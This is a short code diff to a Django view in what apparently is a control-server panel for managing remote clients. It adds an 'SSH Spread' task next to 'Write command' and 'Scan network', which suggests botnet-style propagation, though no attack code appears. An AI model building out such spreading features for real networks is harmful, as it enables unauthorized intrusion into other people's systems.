@@ -15,7 +15,7 @@ def kill_task(request):
 def index(request):
     controlServer = ControlServerHandler()
     controlServer.getClients()
-    tasks = [{'name': "Write command"}, {'name': "Scan network"}]
+    tasks = [{'name': "Write command"}, {'name': "Scan network"}, {'name': "SSH Spread"}]
 
     if request.method == 'POST':
         form = clientForm(request.POST)
